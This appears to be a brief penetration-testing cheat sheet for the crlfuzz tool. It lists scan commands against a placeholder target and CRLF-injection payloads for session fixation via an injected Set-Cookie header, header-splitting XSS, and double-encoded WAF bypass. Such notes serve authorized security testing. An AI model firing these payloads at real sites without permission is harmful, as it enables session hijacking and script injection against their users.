# crlfuzz — Advanced Techniques

## Basic Scan
```bash
crlfuzz -u "https://target.com/path?param=value" -silent
```

## From URL List (Pipeline)
```bash
cat urls.txt | crlfuzz -s
```

## With POST Data
```bash
crlfuzz -u "https://target.com/path" -d "param=value"
```

## With Custom HTTP Method
```bash
crlfuzz -u "https://target.com/path" -X POST
```

## Cookie Injection Test
Payload: `%0d%0aSet-Cookie: session=attacker`
If reflected: session fixation possible.

## XSS via Header Injection
Payload: `%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>`
If reflected in Location header with redirect: XSS possible.

## Double Encoding (WAF Bypass)
Try `%250d%250a` if `%0d%0a` is filtered. WAFs may miss double-encoded sequences.
